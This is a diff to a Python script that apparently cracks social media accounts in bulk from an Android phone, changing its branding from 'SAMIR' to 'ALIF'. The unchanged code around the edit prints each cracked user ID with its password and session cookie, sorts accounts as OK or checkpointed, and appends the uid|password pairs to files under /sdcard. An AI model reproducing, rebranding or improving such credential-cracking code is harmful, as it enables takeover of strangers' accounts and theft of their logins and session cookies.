@@ -514,13 +514,13 @@ def rcrack1(uid,pwx,tl):
 
                 cid = coki[7:22]
 
-                print(f"\033[38;5;46m[SAMIR-OK💛] {uid}|{ps}")
+                print(f"\033[38;5;46m[ALIF-OK💛] {uid}|{ps}")
 
                 print(f" \n Cookie : {coki}")
 
                 print(f" \n ══════════════════════════════════════════")
 
-                open('/sdcard/SAMIR/ok.txt', 'a').write( uid+' | '+ps+'\n')
+                open('/sdcard/ALIF/ok.txt', 'a').write( uid+' | '+ps+'\n')
 
                 oks.append(uid)
 
@@ -532,7 +532,7 @@ def rcrack1(uid,pwx,tl):
 
                 cid = coki[82:97]
 
-                print(f"\x1b[38;5;196m[SAMIR-CP🔒] {uid}|{ps}")
+                print(f"\x1b[38;5;196m[ALIF-CP🔒] {uid}|{ps}")
 
                 open('/sdcard/SAMIR-CP.txt', 'a').write( uid+' | '+ps+' \n')
 
@@ -546,7 +546,7 @@ def rcrack1(uid,pwx,tl):
 
         loop+=1
 
-        sys.stdout.write(f'\r\033[m[SAMIR💉] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
+        sys.stdout.write(f'\r\033[m[ALIF💉] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
 
         sys.stdout.flush()
 
